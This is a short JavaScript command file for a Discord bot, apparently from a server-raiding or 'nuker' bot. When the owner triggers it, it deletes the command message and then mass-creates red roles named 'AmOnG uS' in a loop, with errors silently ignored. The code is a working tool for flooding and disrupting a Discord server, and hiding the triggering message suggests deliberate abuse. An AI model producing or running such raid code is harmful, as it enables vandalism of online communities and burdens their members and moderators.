module.exports.run = async (client, message, args) => {
    const config = require("../config.json");
    if (message.author.id == config.idowner) { } else return;
    message.delete();
    
    for (let i = 0; i < config.role1; i++) {
        message.guild.roles.create({
            color: 'RED',
            name: 'AmOnG uS',
            reason: 'Why not?',
        }).catch()
    }
}

module.exports.config = {
    name: "msrole",
    aliases: ["massrole"]
}
